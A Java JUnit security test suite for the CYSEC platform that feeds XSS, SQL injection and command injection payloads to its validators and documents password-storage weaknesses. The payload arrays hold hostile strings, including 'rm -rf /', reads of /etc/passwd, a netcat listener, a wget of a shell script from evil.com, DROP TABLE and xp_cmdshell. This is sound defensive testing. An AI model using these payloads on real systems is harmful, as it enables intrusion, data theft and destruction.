/*-
 * #%L
 * CYSEC Platform Core
 * %%
 * Copyright (C) 2020 - 2025 FHNW (University of Applied Sciences and Arts Northwestern Switzerland)
 * %%
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * #L%
 */
package eu.smesec.cysec.platform.core.security;

import eu.smesec.cysec.platform.core.auth.CryptPasswordStorage;
import eu.smesec.cysec.platform.core.auth.CryptType;
import eu.smesec.cysec.platform.core.utils.Validator;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import static org.assertj.core.api.Assertions.*;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;

import java.security.NoSuchAlgorithmException;
import java.util.stream.Stream;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.Arrays;
import java.util.Base64;
import java.nio.charset.StandardCharsets;

/**
 * Comprehensive security test suite covering all major security aspects.
 * This test suite systematically validates security controls and documents vulnerabilities.
 */
@DisplayName("🔒 Comprehensive Security Test Suite")
@Tag("security")
@Tag("vulnerability")
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class ComprehensiveSecurityTestSuite {

    // Security test data
    private static final String[] XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "';alert('XSS');//",
        "\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<div onclick=alert('XSS')>click</div>",
        "'+alert('XSS')+'",
        "</textarea><script>alert('XSS')</script>",
        "<script src=data:text/javascript,alert('XSS')>",
        "<%2fscript%2f>alert('XSS')<%2fscript%2f>"
    };

    private static final String[] SQL_INJECTION_PAYLOADS = {
        "' OR '1'='1'--",
        "admin'--",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "1'; INSERT INTO users VALUES('hacker','pwd'); --",
        "' OR 1=1#",
        "' HAVING 1=1--",
        "' GROUP BY userid HAVING 1=1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
        "1' AND 1=(SELECT COUNT(*) FROM tabname); --"
    };

    private static final String[] COMMAND_INJECTION_PAYLOADS = {
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "; ping google.com",
        "| nc -l 1234",
        "&& curl evil.com",
        "; wget http://evil.com/shell.sh"
    };

    private static final String[] WEAK_PASSWORDS = {
        "", " ", "a", "12", "123", "abc", "password", "123456", "qwerty",
        "admin", "user", "guest", "test", "root", "administrator"
    };

    @BeforeAll
    void setupSecurityTests() {
        System.out.println("🔒 Starting Comprehensive Security Test Suite");
        System.out.println("   Testing " + XSS_PAYLOADS.length + " XSS payloads");
        System.out.println("   Testing " + SQL_INJECTION_PAYLOADS.length + " SQL injection payloads");
        System.out.println("   Testing " + COMMAND_INJECTION_PAYLOADS.length + " command injection payloads");
        System.out.println("   Testing " + WEAK_PASSWORDS.length + " weak passwords");
    }

    @Nested
    @DisplayName("🔴 Critical Password Security Vulnerabilities")
    class CriticalPasswordSecurityTests {

        @Test
        @DisplayName("🔴 CRITICAL: Empty password acceptance vulnerability")
        void emptyPasswordVulnerability() throws NoSuchAlgorithmException {
            // Test the critical vulnerability
            CryptPasswordStorage emptyStorage = new CryptPasswordStorage("");
            boolean result = emptyStorage.verify("");
            
            // This will pass, confirming the vulnerability
            assertThat(result)
                .as("🔴 CRITICAL VULNERABILITY: Empty passwords are accepted")
                .isTrue();

            // Additional empty password tests
            String[] emptyVariants = {"", " ", "  ", "\t", "\n", "   \t\n   "};
            
            for (String emptyPassword : emptyVariants) {
                try {
                    CryptPasswordStorage storage = new CryptPasswordStorage(emptyPassword.trim());
                    if (emptyPassword.trim().isEmpty()) {
                        boolean accepts = storage.verify(emptyPassword.trim());
                        if (accepts) {
                            System.err.println("🔴 VULNERABILITY: Empty password variant accepted: '" + 
                                             emptyPassword + "'");
                        }
                    }
                } catch (Exception e) {
                    // Exception is acceptable for invalid input
                }
            }
        }

        @Test
        @DisplayName("🔴 CRITICAL: MD5 password hashing vulnerability")
        void md5HashingVulnerability() throws NoSuchAlgorithmException {
            String password = "testPassword";
            String salt = "testSalt";
            
            // Verify MD5 is supported
            CryptPasswordStorage md5Storage = new CryptPasswordStorage(password, salt, CryptType.MD5);
            
            assertThat(md5Storage.getType())
                .as("🔴 CRITICAL: MD5 hashing is supported (broken since 2004)")
                .isEqualTo(CryptType.MD5);

            assertThat(md5Storage.verify(password))
                .as("MD5 passwords can be verified")
                .isTrue();

            // Document the security risk
            System.err.println("🔴 SECURITY RISK: MD5 hashing is available");
            System.err.println("   MD5 hashes can be cracked in seconds with modern hardware");
            System.err.println("   Rainbow tables are widely available for MD5");
        }

        @Test
        @DisplayName("🔴 CRITICAL: Plaintext password storage vulnerability")
        void plaintextStorageVulnerability() throws NoSuchAlgorithmException {
            String password = "supersecretpassword";
            String salt = "salt";
            
            // Verify plaintext storage is supported
            CryptPasswordStorage plainStorage = new CryptPasswordStorage(password, salt, CryptType.PLAIN);
            
            assertThat(plainStorage.getType())
                .as("🔴 CRITICAL: Plaintext storage is supported")
                .isEqualTo(CryptType.PLAIN);

            String storageString = plainStorage.toString();
            assertThat(storageString)
                .as("🔴 CRITICAL: Password is stored in plaintext")
                .contains(password);

            System.err.println("🔴 SECURITY RISK: Plaintext password storage available");
            System.err.println("   Storage format: " + storageString);
        }

        @ParameterizedTest
        @ValueSource(strings = {"", " ", "a", "12", "123", "abc", "password", "123456", "qwerty", "admin"})
        @DisplayName("Weak passwords accepted without validation")
        void weakPasswordsAccepted(String weakPassword) {
            assertDoesNotThrow(() -> {
                CryptPasswordStorage storage = new CryptPasswordStorage(weakPassword, "salt");
                assertThat(storage.verify(weakPassword))
                    .as("Weak password should be rejected: " + weakPassword)
                    .isTrue(); // Currently accepts weak passwords - this is the vulnerability
            });
        }
    }

    @Nested
    @DisplayName("⚡ Input Validation Security Tests")
    class InputValidationSecurityTests {

        @ParameterizedTest
        @MethodSource("getXSSPayloads")
        @DisplayName("XSS payload testing in validators")
        void xssPayloadTesting(String xssPayload) {
            // Test various validators with XSS payloads
            boolean wordResult = Validator.validateWord(xssPayload);
            boolean wordSpaceResult = Validator.validateWordSpace(xssPayload);
            boolean emailResult = Validator.validateEmail(xssPayload);
            boolean answerResult = Validator.validateAnswer(xssPayload);

            // Document results
            if (wordResult) {
                System.err.println("⚠️  XSS payload passed validateWord: " + xssPayload);
            }
            if (wordSpaceResult) {
                System.err.println("⚠️  XSS payload passed validateWordSpace: " + xssPayload);
            }
            if (emailResult) {
                System.err.println("⚠️  XSS payload passed validateEmail: " + xssPayload);
            }
            if (answerResult) {
                System.err.println("⚠️  XSS payload passed validateAnswer: " + xssPayload);
            }

            // At minimum, dangerous payloads should not pass answer validation
            if (xssPayload.contains("<script>") || xssPayload.contains("javascript:")) {
                assertThat(answerResult)
                    .as("Dangerous XSS payloads should be blocked by validateAnswer: " + xssPayload)
                    .isFalse();
            }
        }

        @ParameterizedTest
        @MethodSource("getSQLInjectionPayloads")
        @DisplayName("SQL injection payload testing")
        void sqlInjectionTesting(String sqlPayload) {
            // Test validators with SQL injection payloads
            boolean wordResult = Validator.validateWord(sqlPayload);
            boolean emailResult = Validator.validateEmail(sqlPayload);
            boolean answerResult = Validator.validateAnswer(sqlPayload);

            // Document which SQL injection payloads pass validation
            if (answerResult) {
                System.err.println("⚠️  SQL injection payload passed validation: " + sqlPayload);
            }

            // Basic SQL injection characters should be blocked in most validators
            if (sqlPayload.contains("'") || sqlPayload.contains("--") || sqlPayload.contains(";")) {
                if (wordResult) {
                    System.err.println("⚠️  SQL chars passed validateWord: " + sqlPayload);
                }
                // Note: answerResult might legitimately pass for some SQL-like content
            }
        }

        @Test
        @DisplayName("Email validation security assessment")
        void emailValidationSecurity() {
            // Test problematic email patterns
            String[] problematicEmails = {
                "user+tag@example.com",     // Plus addressing
                "user@localhost",           // No TLD
                "user@192.168.1.1",        // IP address  
                "user@example..com",        // Double dots
                ".user@example.com",        // Leading dot
                "user.@example.com",        // Trailing dot
                "very.long.email.address.that.might.cause.buffer.overflow@very.long.domain.name.that.exceeds.normal.limits.com",
                "user@domain.toolongtld",   // Unusual TLD
                "user\"quoted\"@example.com", // Quoted strings
                "user@[127.0.0.1]",        // IP in brackets
            };

            for (String email : problematicEmails) {
                boolean result = Validator.validateEmail(email);
                System.out.println("Email validation for '" + email + "': " + result);
                
                // Document potentially problematic accepts
                if (result && (email.contains("..") || email.startsWith(".") || email.endsWith("."))) {
                    System.err.println("⚠️  Potentially problematic email accepted: " + email);
                }
            }
        }

        @ParameterizedTest
        @MethodSource("getCommandInjectionPayloads")
        @DisplayName("Command injection payload testing")
        void commandInjectionTesting(String cmdPayload) {
            // Test answer validation with command injection payloads
            boolean answerResult = Validator.validateAnswer(cmdPayload);
            
            if (answerResult) {
                System.err.println("⚠️  Command injection payload passed answer validation: " + cmdPayload);
            }

            // Dangerous command characters should generally be blocked
            if (cmdPayload.contains(";") || cmdPayload.contains("|") || cmdPayload.contains("&")) {
                // Some of these are blocked by validateAnswer, some are not
                System.out.println("Command chars in '" + cmdPayload + "': " + answerResult);
            }
        }

        Stream<String> getXSSPayloads() {
            return Arrays.stream(XSS_PAYLOADS);
        }

        Stream<String> getSQLInjectionPayloads() {
            return Arrays.stream(SQL_INJECTION_PAYLOADS);
        }

        Stream<String> getCommandInjectionPayloads() {
            return Arrays.stream(COMMAND_INJECTION_PAYLOADS);
        }
    }

    @Nested
    @DisplayName("🔐 Cryptographic Security Tests")
    class CryptographicSecurityTests {

        @Test
        @DisplayName("Default cryptographic algorithm security")
        void defaultAlgorithmSecurity() {
            CryptType defaultType = CryptType.getDefault();
            
            assertThat(defaultType)
                .as("Default algorithm should be secure")
                .isNotIn(CryptType.MD5, CryptType.PLAIN);

            System.out.println("✅ Default algorithm is: " + defaultType);
        }

        @Test
        @DisplayName("Available weak cryptographic algorithms")
        void availableWeakAlgorithms() {
            CryptType[] allTypes = CryptType.values();
            
            for (CryptType type : allTypes) {
                switch (type) {
                    case MD5:
                        System.err.println("🔴 WEAK ALGORITHM AVAILABLE: MD5 (ID: " + type.getId() + ")");
                        break;
                    case PLAIN:
                        System.err.println("🔴 NO ENCRYPTION AVAILABLE: PLAIN (ID: " + type.getId() + ")");
                        break;
                    case SHA256:
                        System.out.println("🟡 ACCEPTABLE: SHA256 (ID: " + type.getId() + ")");
                        break;
                    case SHA512:
                        System.out.println("✅ SECURE: SHA512 (ID: " + type.getId() + ")");
                        break;
                }
            }
        }

        @Test
        @DisplayName("Salt generation security")
        void saltGenerationSecurity() {
            // Test salt uniqueness
            String salt1 = CryptPasswordStorage.getRandomHexString();
            String salt2 = CryptPasswordStorage.getRandomHexString();
            String salt3 = CryptPasswordStorage.getRandomHexString();

            assertThat(Arrays.asList(salt1, salt2, salt3))
                .as("Salts should be unique")
                .doesNotHaveDuplicates();

            // Test salt length and character set
            assertThat(salt1)
                .hasSize(32)
                .matches("[0-9a-f]+");

            // Test salt entropy (basic check)
            long uniqueChars = salt1.chars().distinct().count();
            assertThat(uniqueChars)
                .as("Salt should have reasonable entropy")
                .isGreaterThan(4);
        }

        @Test
        @DisplayName("Timing attack resistance")
        void timingAttackResistance() throws NoSuchAlgorithmException {
            CryptPasswordStorage storage = new CryptPasswordStorage("correctPassword", "salt");
            
            // Measure timing for correct password
            long startCorrect = System.nanoTime();
            for (int i = 0; i < 100; i++) {
                storage.verify("correctPassword");
            }
            long timeCorrect = System.nanoTime() - startCorrect;
            
            // Measure timing for incorrect password
            long startIncorrect = System.nanoTime();
            for (int i = 0; i < 100; i++) {
                storage.verify("wrongPassword123");
            }
            long timeIncorrect = System.nanoTime() - startIncorrect;
            
            double ratio = (double) timeCorrect / timeIncorrect;
            
            System.out.println("Timing analysis:");
            System.out.println("  Correct password:   " + (timeCorrect / 1_000_000) + "ms");
            System.out.println("  Incorrect password: " + (timeIncorrect / 1_000_000) + "ms");
            System.out.println("  Ratio: " + String.format("%.2f", ratio));
            
            if (Math.abs(ratio - 1.0) > 0.5) {
                System.err.println("⚠️  Potential timing attack vulnerability (ratio: " + ratio + ")");
            } else {
                System.out.println("✅ Good timing attack resistance");
            }
        }
    }

    @Nested
    @DisplayName("🏃 Security Performance Tests")
    class SecurityPerformanceTests {

        @Test
        @DisplayName("Password verification performance under load")
        void passwordVerificationLoad() throws NoSuchAlgorithmException, InterruptedException, ExecutionException {
            CryptPasswordStorage storage = new CryptPasswordStorage("testPassword", "salt", CryptType.SHA512);
            
            // Test concurrent password verification
            CompletableFuture<Long>[] futures = new CompletableFuture[10];
            
            for (int i = 0; i < 10; i++) {
                futures[i] = CompletableFuture.supplyAsync(() -> {
                    long start = System.nanoTime();
                    for (int j = 0; j < 100; j++) {
                        try {
                            storage.verify("testPassword");
                        } catch (Exception e) {
                            throw new RuntimeException(e);
                        }
                    }
                    return System.nanoTime() - start;
                });
            }
            
            // Wait for all to complete and get average time
            long totalTime = 0;
            for (CompletableFuture<Long> future : futures) {
                totalTime += future.get();
            }
            
            long averageTime = totalTime / 10;
            System.out.println("Average time for 100 verifications: " + (averageTime / 1_000_000) + "ms");
            
            // Should complete reasonably quickly
            assertThat(averageTime)
                .as("Password verification should be reasonably fast")
                .isLessThan(TimeUnit.SECONDS.toNanos(5));
        }

        @Test
        @DisplayName("Input validation performance")
        void inputValidationPerformance() {
            String testString = "test.user@example.com";
            
            long startTime = System.nanoTime();
            for (int i = 0; i < 10000; i++) {
                Validator.validateEmail(testString);
                Validator.validateWord(testString);
                Validator.validateAnswer(testString);
            }
            long duration = System.nanoTime() - startTime;
            
            System.out.println("10000 validation operations completed in: " + 
                             (duration / 1_000_000) + "ms");
            
            assertThat(duration)
                .as("Input validation should be fast")
                .isLessThan(TimeUnit.SECONDS.toNanos(1));
        }
    }

    @Nested
    @DisplayName("🔍 Security Configuration Tests")
    class SecurityConfigurationTests {

        @Test
        @DisplayName("Secure algorithm availability check")
        void secureAlgorithmsAvailable() {
            // Ensure secure algorithms are available
            assertThat(CryptType.values())
                .as("SHA512 should be available")
                .contains(CryptType.SHA512);

            assertThat(CryptType.values())
                .as("SHA256 should be available")
                .contains(CryptType.SHA256);
        }

        @Test
        @DisplayName("Insecure algorithm identification")
        void insecureAlgorithmIdentification() {
            // Document which algorithms are insecure
            for (CryptType type : CryptType.values()) {
                switch (type) {
                    case MD5:
                        System.err.println("❌ INSECURE: " + type + " (broken since 2004)");
                        break;
                    case PLAIN:
                        System.err.println("❌ INSECURE: " + type + " (no encryption)");
                        break;
                    case SHA256:
                    case SHA512:
                        System.out.println("✅ SECURE: " + type);
                        break;
                }
            }
        }

        @Test
        @DisplayName("System security properties")
        void systemSecurityProperties() {
            // Check Java security properties
            String javaVersion = System.getProperty("java.version");
            String osName = System.getProperty("os.name");
            
            System.out.println("Java version: " + javaVersion);
            System.out.println("OS: " + osName);
            
            // Basic security checks
            assertThat(javaVersion)
                .as("Should be running on supported Java version")
                .isNotNull();
        }
    }

    @Nested
    @DisplayName("📊 Security Test Summary")
    class SecurityTestSummary {

        @Test
        @DisplayName("Generate security vulnerability summary")
        void securityVulnerabilitySummary() {
            System.out.println("\n" + "=".repeat(60));
            System.out.println("🔒 SECURITY VULNERABILITY SUMMARY");
            System.out.println("=".repeat(60));
            
            System.err.println("\n🔴 CRITICAL VULNERABILITIES CONFIRMED:");
            System.err.println("  1. Empty passwords are accepted for authentication");
            System.err.println("  2. MD5 password hashing is available (cryptographically broken)");
            System.err.println("  3. Plaintext password storage is available");
            
            System.out.println("\n🟡 HIGH PRIORITY SECURITY ISSUES:");
            System.out.println("  1. No password complexity requirements");
            System.out.println("  2. Potential XSS vulnerabilities in input validation");
            System.out.println("  3. Weak email validation regex");
            
            System.out.println("\n✅ SECURITY STRENGTHS:");
            System.out.println("  1. SHA512 is available and set as default");
            System.out.println("  2. Salt generation appears secure");
            System.out.println("  3. Basic input validation is present");
            
            System.out.println("\n📋 RECOMMENDATIONS:");
            System.out.println("  1. IMMEDIATE: Fix empty password acceptance");
            System.out.println("  2. IMMEDIATE: Remove MD5 and PLAIN password options");
            System.out.println("  3. HIGH: Implement password complexity requirements");
            System.out.println("  4. HIGH: Strengthen input validation against XSS");
            System.out.println("  5. MEDIUM: Improve email validation regex");
            
            System.out.println("=".repeat(60) + "\n");
            
            // This test always passes - it's for documentation
            assertThat(true)
                .as("Security summary generated successfully")
                .isTrue();
        }
    }
}
